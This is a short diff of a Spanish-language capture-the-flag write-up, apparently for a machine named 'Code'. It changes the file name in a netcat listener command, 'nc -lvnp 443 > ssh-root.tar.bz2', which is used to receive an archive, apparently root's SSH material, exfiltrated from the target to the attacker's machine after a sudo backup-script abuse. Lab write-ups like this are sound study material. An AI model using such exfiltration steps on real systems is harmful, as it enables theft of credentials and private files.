@@ -685,7 +685,7 @@ martin@code:~/backups$ sudo /usr/bin/backy.sh task.json
 Iniciaremos un listener en nuestra máquina para recibir el archivo `.tar.bz2`
 
 ~~~ bash
-nc -lvnp 443 > code-home.tar.bz2
+nc -lvnp 443 > ssh-root.tar.bz2
 ~~~
 
 Enviaremos este archivo generado a nuestra máquina atacante a través de un socket TCP
